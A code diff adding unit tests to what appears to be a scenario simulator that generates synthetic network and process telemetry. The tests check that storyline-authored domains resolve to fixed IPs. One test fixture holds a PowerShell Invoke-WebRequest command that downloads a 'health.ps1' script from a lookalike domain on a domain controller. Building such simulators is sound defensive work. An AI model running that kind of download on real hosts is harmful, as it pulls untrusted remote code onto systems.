@@ -71,6 +71,26 @@ class TestStorylineCommandNetworks:
             "10.10.2.30"
         )
 
+    def test_storyline_authored_ip_for_hostname_uses_explicit_dns_answer(self):
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            storyline=[
+                SimpleNamespace(
+                    events=[
+                        SimpleNamespace(
+                            type="dns_query",
+                            query="cdn-assets-update.com",
+                            answer="45.33.32.30",
+                        )
+                    ]
+                )
+            ]
+        )
+
+        assert engine._storyline_authored_ip_for_hostname("cdn-assets-update.com") == (
+            "45.33.32.30"
+        )
+
 
 class _FakeActivityGenerator:
     def __init__(self) -> None:
@@ -244,6 +264,59 @@ class TestStorylineScpCorrelation:
         )
 
         assert engine.activity_generator.processes[0]["ensure_file_event"] is False
+
+    def test_process_url_network_reuses_storyline_authored_domain_ip(self):
+        source = System(
+            hostname="DC-01",
+            ip="10.10.2.10",
+            os="Windows Server 2022",
+            type="domain_controller",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[]),
+            storyline=[
+                SimpleNamespace(
+                    events=[
+                        SimpleNamespace(
+                            type="connection",
+                            hostname="cdn-assets-update.com",
+                            dst_ip="45.33.32.30",
+                        )
+                    ]
+                )
+            ],
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        spec = SimpleNamespace(
+            type="process",
+            process_name="powershell.exe",
+            command_line=(
+                "powershell.exe -NoProfile -Command "
+                "\"Invoke-WebRequest -Uri 'https://cdn-assets-update.com/health.ps1'\""
+            ),
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            activity="download health script",
+            explicit_types={"process"},
+        )
+
+        conn = engine.activity_generator.connections[-1]
+        assert conn["dst_ip"] == "45.33.32.30"
+        assert conn["hostname"] == "cdn-assets-update.com"
+        assert conn["preserve_dst_ip"] is True
 
     def test_storyline_dhcp_lease_reuses_existing_host_lease_identity(self):
         source = System(
